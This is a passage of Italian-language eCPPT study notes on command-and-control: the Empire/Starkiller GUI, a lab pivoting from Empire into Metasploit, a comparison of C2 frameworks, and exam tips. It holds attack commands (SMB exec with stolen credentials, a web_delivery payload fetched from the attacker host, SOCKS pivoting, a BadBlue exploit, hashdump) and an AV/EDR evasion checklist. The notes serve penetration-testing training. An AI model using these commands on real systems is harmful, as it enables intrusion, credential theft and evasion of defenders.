- **Errore tipico**: `local variable module_code referenced before assignment` su moduli che richiedono parametri obbligatori non configurati. Soluzione: scegliere modulo alternativo (es. `winenum` come fallback) o impostare l'opzione mancante.

### File browser

- View agent → tab **File Browser** → click su directory → l'agent risponde al prossimo beacon → tree popolato → click su file → **Download** → trasferito al server Em⁠pire.

### Tasks log (audit trail)

- Tab **Tasks** (o sotto-tab dell'agent) → tabella `TaskID | User | Command | Status` → drop-down per vedere comando e output → audit completo della session.
- Essenziale per multiplayer: ogni task ha l'autore (`who ran it`).

### Tuning beacon con Wireshark (demo video 010)

1. Wireshark su `eth1` → filtro `ip.src == <target_ip>`.
2. Si vedono i callback HTTP ogni **5 s** (perfettamente periodici → sospettissimi).
3. Modifica `DefaultDelay = 10` sull'agent/listener → callback ogni 10 s.
4. Modifica `DefaultJitter = 0.5` (50%) → randomizza la cadenza fra `delay*(1-jitter)` e `delay*(1+jitter)` → traffic pattern meno periodico → **OPSEC**.

### Tabella equivalenze GUI ↔ CLI

| Azione GUI | Equivalente CLI |
|---|---|
| Listeners → Create → http | `uselistener http; set ...; execute` |
| Stagers → Create → multi/launcher | `usestager multi/launcher; set Listener http; execute` |
| Agents → View → command box | `interact <agent>; shell <cmd>` |
| Modules → search → Submit | `usemodule <path>; set ...; execute` |
| Tasks tab | `history` |
| Credentials tab | `creds` |
| Users tab | `add user` server-side |

### Vantaggi reali GUI vs CLI

- **Interactive agent shell** con risultati quasi istantanei nel pannello.
- **File browser** integrato (navigazione filesystem del target, download diretto).
- **Process browser**.
- **Chat widget** per multiplayer / collaborative ops.
- **Task log** centralizzato con autore — utile per report.
- **Form-based** module configuration → meno errori di sintassi.

---

## 8. Integrazione Em⁠pire ↔ Metasploit (pivoting)

Il lab del video 09 mostra un'integrazione end-to-end per fare **pivoting** verso una subnet interna sfruttando il modulo `code_execution/invoke_metasploitpayload` di Em⁠pire.

### Topologia del lab

- **Kali Linux** (attacker) → `eth1` IP variabile.
- **`demo.ine.local`** — Windows Server 2012 R2, raggiungibile direttamente.
  - Servizi: 135, 139, 445 (SMB), 3389 (RDP), **4983** (Apache con error log + creds).
  - Pivot verso la subnet interna.
- **`fileserver.ine.local`** — Windows Server 2016, **non raggiungibile** dalla Kali. Accessibile solo via pivot da demo.
  - Servizi (port scan da demo): 80, 3389, 445.

### Flusso completo (11 passi)

1. **Nmap full TCP** + service version su `demo.ine.local`.
2. **Browser** sulla porta 4983 → error log Apache mostra credenziali admin (incluse `@` e `#` nel pwd).
3. `impacket-smbexec administrator:'<pass>'@demo.ine.local` → shell `nt authority\system` (verificare `whoami /priv`).
4. Avvio `sudo powershell-empire server` + `powershell-empire client`.
5. **Setup listener HTTP** su porta 8888 (`uselistener http; set Host <kali>; set Port 8888; execute`).
6. **Genera stager** `multi/launcher`, incolla nella shell SMB → agent callback.
7. **Interact** → enum (`winenum`) + dump credenziali (`lsadump`) → NTLM hash administrator + local admin.
8. **Port scan da Em⁠pire** verso fileserver: `usemodule powershell/situational_awareness/network/portscan; set Hosts <fileserver>; execute` → trova 80/3389/445.
9. **MSF web_delivery** → `invoke_metasploitpayload` Em⁠pire → Meterpreter session su demo:
   ```text
   # In msfconsole:
   use exploit/multi/script/web_delivery
   set TARGET 2                              # PowerShell
   set PAYLOAD windows/meter⁠preter/reverse_tcp
   set LHOST <kali>
   exploit                                   # genera URL http://<kali>:8080/<rnd>

   # In empire client:
   usemodule powershell/code_execution/invoke_metasploitpayload
   set URL http://<kali>:8080/<rnd>
   execute
   ```
10. **Autoroute + SOCKS proxy** in MSF:
    ```text
    use post/multi/manage/autoroute
    set SESSION 1
    run                                       # aggiunge route per subnet interna

    use auxiliary/server/socks_proxy
    set SRVHOST <kali>
    run                                       # SOCKS v5 su 1080
    ```
11. **Browser via SOCKS** → Firefox → Settings → manual proxy → SOCKS v5 `<kali>:1080` → naviga `http://fileserver.ine.local` → vede **BadBlue**.

### Exploit BadBlue dietro pivot

```text
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meter⁠preter/bind_tcp       # ATTENZIONE: bind, non reverse!
set RHOSTS fileserver.ine.local
exploit
```

**Perche' `bind_tcp` e non `reverse_tcp`?** Il target sta dietro un pivot e **non puo'** instradare il traffico verso la Kali (no route di ritorno). Con `bind_tcp` il target **apre una porta in ascolto** e l'attaccante si connette (passando attraverso il SOCKS/route). Errore comune in esame: usare `reverse_tcp` dietro pivot → niente sessione.

### Post-exploitation su fileserver

```text
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
migrate <lsass_pid>
hash⁠dump
```

### Riepilogo concetti dal lab

- **C2 ≠ initial access**: il C2 entra in gioco DOPO aver bucato.
- **Stager `multi/launcher`** = one-liner PowerShell base64, ideale per drop da qualsiasi shell.
- **Asterisco** nel nome agent = high integrity.
- **Beacon delay**: default 5 s, modificabile con `sleep`/`set Delay`.
- **Pivoting pattern eCPPT**: compromise → `autoroute` → `socks_proxy` → tool esterno (browser/proxychains) per raggiungere subnet interna.
- **Bind vs Reverse**: dietro pivot senza route di ritorno → **bind_tcp**.
- **Pass-the-Hash via Em⁠pire**: `lateral_movement/invoke_smbexec` con `Username` + `Hash` NTLM.
- **`invoke_metasploitpayload`** = ponte ufficiale Em⁠pire → MSF.

---



### Quiz: Star⁠killer, integrazione MSF e altri framework

<div class="ecppt-quiz" data-module="08_Command_Control" data-block="3"></div>

## 9. Altri framework C2

Il video 07 e il video 011 (conclusione) citano alternative a Em⁠pire. **Non sono coperti con walkthrough video**: l'istruttore rimanda ai lab self-paced. Sintesi panoramica:

### Cobalt Strike (commerciale, leader storico)

- **Vendor:** Fortra (ex HelpSystems / Strategic Cyber LLC).
- **Prezzo:** ~$5,900/utente/anno (licenze annuali).
- **Server language:** Java (Team Server).
- **Client:** Aggressor (Java GUI, multi-user nativo).
- **Implant:** Beacon (C, in-memory).
- **Canali:** HTTP, HTTPS, DNS, **SMB (named pipe)**, TCP.
- **Killer features:**
  - **Malleable C2 profiles** (mimicry di traffico legittimo).
  - **Beacon Object Files (BOF)** — esecuzione in-process di codice C compilato senza fork.
  - **Aggressor scripts** (scripting con linguaggio dedicato).
  - SMB peer-to-peer beacons per host segmentati.
- **Note:** ampiamente "leak-ato" e usato anche da threat actors reali (Conti, ecc.) → fortemente signature-d da EDR. Versioni cracked = OPSEC zero.

### Mythic (open source, modulare)

- **Repo:** SpecterOps / Mythic.
- **Server language:** Python (Docker stack).
- **UI:** Web (React).
- **Implant:** **modulare** — agenti diversi (Apollo C#, Poseidon Go, Athena .NET, Atlas, Medusa Python).
- **Canali:** HTTP, HTTPS, DNS, SMB, custom.
- **Killer features:**
  - **Multi-agent multi-language** in un unico server.
  - Web UI moderna con grafici e task tree.
  - **Containerized profiles** (ogni profile e' un container).
- **Use case:** scenari complessi multi-OS / multi-payload.

### Sliver (open source, "Cobalt Strike killer" gratis)

- **Vendor:** Bishop Fox.
- **Linguaggio:** Go (server + implant).
- **UI:** CLI (`sliver-server`, `sliver-client`).
- **Canali:** **mTLS**, **WireGuard**, HTTP, HTTPS, DNS.
- **Killer features:**
  - **Cross-platform** (Windows, Linux, macOS) con un unico framework.
  - **Stageless** by default → no problemi di stager piccolo.
  - **Multiplayer** nativo.
  - **Beacon mode** + **session mode** (interattivo).
  - Buona evasion AV (rispetto a Cobalt Strike leak-ato).
- **Use case:** sostituto open-source di Cobalt Strike per team con budget zero.

### Havoc (open source, moderno)

- **Repo:** HavocFramework (C5pider).
- **Linguaggio:** server Go/C++, client C++/Qt, implant C.
- **UI:** GUI desktop (Qt).
- **Canali:** HTTP, HTTPS, SMB.
- **Killer features:**
  - Look-and-feel simil-Cobalt Strike (multiplayer, beacon, BOF-like).
  - Implant moderno con buona evasion.
  - Sviluppo molto attivo.
- **Use case:** alternativa moderna gratuita per red team Windows-centric.

### Brute Ratel (commerciale, Windows-only)

- **Vendor:** Dark Vortex (Chetan Nayak).
- **Prezzo:** ~$2,500/utente.
- **Server language:** Golang.
- **Implant:** C / x64 ASM (solo Windows).
- **Canali:** TCP, HTTP, SMB, LDAP.
- **UI:** GUI multi-user.
- **Killer features:**
  - **Anti-EDR** per design — focus dichiarato su evasion.
  - Implant minimal con basso footprint.
- **Note:** anche questo leak-ato 2022 → uso da threat actors reali.

### Covenant (open source, .NET)

- **Repo:** cobbr/Covenant.
- **Linguaggio:** .NET Core (server + implant "Grunt").
- **UI:** Web (Blazor).
- **Killer features:**
  - Pure .NET — adatto per ambienti Windows enterprise.
  - Roslyn compilation in-server.
- **Stato:** poco aggiornato negli ultimi anni.

### Tabella riassuntiva alternative

| Framework | Licenza | Server lang | Implant | OS target | Canali principali | UI |
|---|---|---|---|---|---|---|
| **Cobalt Strike** | Commerciale ($5.9k) | Java | C beacon | Win | HTTP/HTTPS/DNS/SMB/TCP | GUI Java |
| **PowerShell-Em⁠pire** | Open (BSD) | Python 3 | PS / Py / C# | Win/Lin/mac | HTTP/HTTPS/Dropbox/OneDrive | CLI + Star⁠killer |
| **Mythic** | Open (BSD) | Python (Docker) | modulare | Win/Lin/mac | HTTP/HTTPS/DNS/SMB | Web React |
| **Sliver** | Open (GPL3) | Go | Go | Win/Lin/mac | mTLS/WireGuard/HTTP/DNS | CLI |
| **Havoc** | Open (GPL3) | Go/C++ | C | Win | HTTP/HTTPS/SMB | GUI Qt |
| **Brute Ratel** | Commerciale ($2.5k) | Go | C/ASM | Win | TCP/HTTP/SMB/LDAP | GUI |
| **Covenant** | Open (GPL3) | .NET Core | .NET (Grunt) | Win | HTTP/HTTPS | Web Blazor |
| **Merlin** | Open (GPL3) | Go | Go | Cross | HTTP/2/HTTP/3 | CLI |
| **Poshc2** | Open (BSD) | Python | PS/C#/Py | Win/Lin/mac | HTTP/HTTPS | CLI |
| **Metasploit** | Open (BSD)/Pro | Ruby | Meterpreter | Cross | TCP/HTTP/HTTPS | CLI |

---

## 10. OPSEC & evasion

### Lato client (evasion AV/EDR)

- **PE encoding & obfuscation** (msfvenom encoders, custom packers).
- **Shellcode injection in memoria** (process hollowing, APC injection, early bird, queue user APC, mappa di file di paging).
- **PowerShell encoding** (`-Encoded⁠Command` base64) + **Invoke-Obfus⁠cation** (tokenize, AST mangle, string concat, char-encoding).
- **ConfuserEx 2** per offuscamento .NET assembly.
- **Power⁠Sploit** (`Invoke-Shellcode`, `Invoke-ReflectivePEInjection`) per esecuzione in-memory.
- **In-memory .NET assembly execution** via Roslyn (Em⁠pire integrato).
- **Donut** per generazione shellcode da .NET assembly.
- **AMSI bypass** (patch in-memory di `AmsiScanBuffer`).
- **ETW bypass** (patch `EtwEventWrite`).
- **API unhooking** (riscrittura NTDLL.dll in-memory per rimuovere user-land hook di EDR).

### Lato network (evasion IDS/IPS)

- **Porte standard**: 443 > 80 > 8080.
- **Domini fidati**, non IP raw.
- **HTTPS** sempre.
- **Sleep + Jitter** alti (sleep 60 s+, jitter 0.5+).
- **Malleable C2 profiles** (Cobalt Strike) per imitare traffico legittimo.
- **Domain fronting** (T1090.004) tramite CDN.
- **Protocolli alternativi**: DNS (53/UDP), ICMP, SMB (interno), DoH.
- **Redirector** davanti al team server.
- **Working hours / kill date** sui beacon (l'agent dorme fuori orario / si autodistrugge dopo una data).

### Lato infrastrutturale (OPSEC operatore)

- **Mai SSH diretto** dal laptop personale al C2 server.
- **VPN** (WireGuard / OpenVPN) tra operatore e team server.
- **Domain warming**: registrare domini con storia (vecchi, con TLS Cert Transparency log puliti), evitare domini freschi.
- **Provisioning automatizzato** (Terraform/Ansible) per ricreare infrastruttura velocemente.
- **Logging centralizzato** (essenziale per attribuzione e legalita').
- **Backup dei beacon database** (perdere il team server = perdere gli agent).

---

## 11. Mappa MITRE ATT&CK

| Tactic | ID | Technique tipica | Rilevanza C2 |
|---|---|---|---|
| **Command and Control** | **TA0011** | — | Tactic ombrello del modulo |
| Application Layer Protocol | T1071 | HTTP/HTTPS/DNS/SMB | Em⁠pire/CS HTTP listeners |
| Application Layer Protocol — Web | T1071.001 | HTTP/HTTPS | Listener http Em⁠pire |
| Application Layer Protocol — DNS | T1071.004 | DNS tunneling | Sliver DNS, CS DNS beacon |
| Encrypted Channel | T1573 | Symmetric/Asymmetric | TLS, RC4, AES dei beacon |
| Encrypted Channel — Symmetric | T1573.001 | AES/RC4 | Em⁠pire RC4/AES, CS beacon |
| Proxy | T1090 | Proxy via redirector | Redirector NGINX |
| Proxy — Domain Fronting | **T1090.004** | CDN host header trick | Cloudflare/Fastly |
| Proxy — Internal Proxy | T1090.001 | SOCKS via beacon | MSF `socks_proxy` |
| Web Service | T1102 | Dropbox/OneDrive/GitHub | Em⁠pire `dbx` listener |
| Ingress Tool Transfer | T1105 | Download payload via beacon | `download`/`upload` Em⁠pire |
| Non-Standard Port | T1571 | Porte non standard | Anti-pattern (mai usare) |
| Protocol Tunneling | T1572 | DNS tunneling, HTTP tunnel | DNS C2 |
| Multi-Stage Channels | T1104 | Staged payload | stager → stage |
| Fallback Channels | T1008 | Secondary C2 | Cobalt Strike fallback |

---

## 12. Punti d'attenzione esame eCPPT

L'esame eCPPT (formato 2024) e' composto da **45 domande a risposta multipla** su un ambiente pratico. Non chiede di deployare un C2 da zero, ma copre:

### Concetti teorici (probabili in MCQ)

- **C2 = tactic MITRE ATT&CK TA0011** (non solo "il tool").
- **C2 ≠ reverse shell**: encryption nativa, multi-user, logging, persistence built-in.
- **Definizione di C2**: "struttura di comunicazione per remote control e coordination".
- **Componenti**: C2 server, agent/implant, communication channel, operator interface.
- **C2 in initial access e' raro** — il C2 entra in gioco DOPO il foothold (post-exploitation).
- **Metasploit e' tecnicamente un C2 framework** (trick question potenziale).

### Terminologia (memorizzazione)

- **Listener** = lato server. **Agent** = lato client/target. (Confonderli e' errore frequente.)
- **Stager → Stage** = staged payload. `multi/launcher` Em⁠pire = stager PowerShell base64 one-liner.
- **Implant / Agent / Payload / Stager** spesso sinonimi → riconoscerli come equivalenti.
- **Beacon ≠ reverse shell**: pattern di callback periodico, latency = `sleep` × 2.
- **Sleep + Jitter** sono i due parametri OPSEC critici.
- **Asterisco nel nome agent Em⁠pire** = **high integrity** (admin/SYSTEM).

### Deployment & evasion

- **Porta C2 default sensata**: **443/TCP** (HTTPS). Mai IP raw — sempre domini.
- **Egress filtering**: se solo 80/443 sono aperti → HTTPS C2; se neanche → DNS tunneling.
- **Domain fronting** = **T1090.004**, classico con Cloudflare. Conosci il flusso: agent → CDN → vero C2.
- **In-memory PowerShell execution** = pilastro evasion Windows (Em⁠pire lo fa nativamente).
- **Match framework ↔ target**: Windows → Em⁠pire/Cobalt Strike; cross-platform → Sliver/Mythic.

### Em⁠pire specifico

- **Versione corrente**: Em⁠pire 4 (Python 3), mantenuta da **BC Security**, pacchetto Kali `powershell-empire`.
- **Porte default**: REST API **1337/TCP**, Socket.IO **5000/TCP**.
- **Credenziali default Star⁠killer**: `empire_admin / password123`.
- **Server e client separati** (due processi distinti).
- **Agent Windows pure PowerShell senza `powershell.exe`** → bypass AppLocker.
- **HTA + `mshta.exe`** = vettore preferito per drop (LOLBAS).
- **Donut** = shellcode generator integrato.
- **Workflow CLI da memorizzare**: `uselistener → execute → usestager → generate → agents → interact → usemodule`.

### Pivoting (lab 09)

- **Pattern eCPPT**: compromise → `autoroute` MSF → `socks_proxy` MSF → tool esterno (browser/proxychains) per raggiungere subnet interna.
- **Bind vs Reverse**: dietro un pivot senza route di ritorno → **bind_tcp** (target ascolta, attacker si connette). Errore comune: usare `reverse_tcp` e non avere sessione.
- **Pass-the-Hash via Em⁠pire**: `lateral_movement/invoke_smbexec` con `Username` + `Hash` NTLM.
- **`code_execution/invoke_metasploitpayload`** = ponte ufficiale Em⁠pire → Metasploit (consuma URL `web_delivery`).
- **`management/invoke_portfwd`** = port forwarding via agent (alternativa al SOCKS).

### Star⁠killer specifico

- **Star⁠killer e' solo un front-end**: tutta la logica sta sul server Em⁠pire.
- **REST API porta 1337** = endpoint a cui Star⁠killer si connette.
- **Multiplayer**: piu' operatori connessi simultaneamente con account distinti, chat e attribuzione task.
- **File Browser + Tasks log** = vantaggi reali rispetto alla CLI ("perche' usare la GUI?").
- **Stager copy-paste**: la GUI non stampa il one-liner, va copiato con il pulsante Copy.

### Confronto framework (potenziale "quale C2 useresti se...")

- **Windows-only commerciale ad alta evasion** → Brute Ratel / Cobalt Strike.
- **Cross-platform open-source moderno** → Sliver.
- **Modular multi-OS multi-agent** → Mythic.
- **PowerShell-centric Windows post-ex** → Em⁠pire.
- **GUI .NET enterprise** → Covenant.
- **Look simil-CS gratis** → Havoc.

### Integrazione con altri moduli del corso

Il modulo C2 si **integra** con (e prende per scontati) i contenuti di:

- **Lateral Movement & Pivoting** — `autoroute`, `socks_proxy`, port-fwd, PsExec, WMIExec, Pass-the-Hash.
- **Client-Side Attacks** — HTA, macro Office come stager iniziali (phishing).
- **PowerShell for Pentesters** — offuscamento (Invoke-Obfus⁠cation), in-memory execution (Power⁠Sploit), AV evasion (Shellter).
- **Active Directory Penetration Testing** — Mimi⁠katz LSA dump, Power⁠View (`situational_awareness/network/powerview/*`), Pass-the-Hash, Kerberoasting.
- **Privilege Escalation** — moduli `privesc/powerup/*` di Em⁠pire, token impersonation, named pipe abuse.

---

## 13. Riferimenti ai video sorgente

Tutti i path sono relativi a `_summaries/08_Command_Control.md`.

- [01 — Course Introduction](../Command%20&%20Control%20(C2C&C)/01_Course%20Introduction.md)
- [02 — Introduction to Command & Control](../Command%20&%20Control%20(C2C&C)/02_Introduction%20to%20Command%20&%20Control.md)
- [03 — Introduction to C2 Frameworks](../Command%20&%20Control%20(C2C&C)/03_Introduction%20to%20C2%20Frameworks.md)
- [05 — C2 Framework Terminology](../Command%20&%20Control%20(C2C&C)/05_%20C2%20Framework%20Terminology.md)
- [06 — C2 Deployment & Operation](../Command%20&%20Control%20(C2C&C)/06_C2%20Deployment%20&%20Operation.md)
- [07 — The C2 Matrix: Choosing the Correct C2 Framework](../Command%20&%20Control%20(C2C&C)/07_The%20C2%20Matrix%20-%20Choosing%20the%20Correct%20C2%20Framework.md)
- [08 — Introduction to PowerShell-Em⁠pire](../Command%20&%20Control%20(C2C&C)/08_Introduction%20to%20PowerShell-Em⁠pire.md)
- [09 — Red Team Ops with PowerShell-Em⁠pire](../Command%20&%20Control%20(C2C&C)/09_%20Red%20Team%20Ops%20with%20PowerShell-Em⁠pire.md)
- [010 — Red Team Ops with Star⁠killer](../Command%20&%20Control%20(C2C&C)/010_Red%20Team%20Ops%20with%20Star⁠killer.md)
- [011 — Course Conclusion](../Command%20&%20Control%20(C2C&C)/011_%20Course%20Conclusion.md)

Versioni anche con path "raw" (senza URL-encoding) per i sistemi che le supportano:

- `../Command & Control (C2C&C)/01_Course Introduction.md`
- `../Command & Control (C2C&C)/02_Introduction to Command & Control.md`
- `../Command & Control (C2C&C)/03_Introduction to C2 Frameworks.md`
- `../Command & Control (C2C&C)/05_ C2 Framework Terminology.md`
- `../Command & Control (C2C&C)/06_C2 Deployment & Operation.md`
- `../Command & Control (C2C&C)/07_The C2 Matrix - Choosing the Correct C2 Framework.md`
- `../Command & Control (C2C&C)/08_Introduction to PowerShell-Em⁠pire.md`
- `../Command & Control (C2C&C)/09_ Red Team Ops with PowerShell-Em⁠pire.md`
- `../Command & Control (C2C&C)/010_Red Team Ops with Star⁠killer.md`
- `../Command & Control (C2C&C)/011_ Course Conclusion.md`

---

## Appendice A — Cheat sheet comandi Em⁠pire CLI

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Command & Control: Em⁠pire CLI](../10_Cheatsheet.md#command-control-empire-cli).

---

## Appendice B — Cheat sheet integrazione MSF (web_delivery + pivot)

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Command & Control: integrazione MSF](../10_Cheatsheet.md#command-control-integrazione-msf).

---

## Appendice C — Self-check (recap learning objectives)

Domande di verifica autonoma (dal video 011, adattate):

1. Spiega a parole tue cosa fa un C2 framework e perche' esiste.
2. Disegna il flusso **centralized vs P2P**.
3. Elenca **3 protocolli C2** con pro/contro OPSEC.
4. Esegui un attack chain Em⁠pire completo: listener → stager → agent → modulo → loot.
5. Esponi l'output di un questionario C2 Matrix giustificando la scelta.
6. Confronta almeno due framework alternativi (anche solo a livello di feature).
7. Spiega la differenza tra **stager** e **stage**.
8. Quanto vale la latency di un comando se `sleep=10` e `jitter=0.5`? Range minimo/massimo?
9. Perche' dietro un pivot devi usare `bind_tcp` invece di `reverse_tcp`?
10. Cos'e' il domain fronting? Che tactic/technique MITRE? Come si setta con Cloudflare?
11. Qual e' la differenza tra **listener** e **agent**?
12. Perche' l'asterisco accanto al nome agent in Em⁠pire e' importante?
13. Quali porte espone il server Em⁠pire (REST API e Socket.IO)?
14. Quali sono le credenziali default di Star⁠killer?
15. Quale modulo Em⁠pire usi per fare il bridge verso Metasploit `web_delivery`?
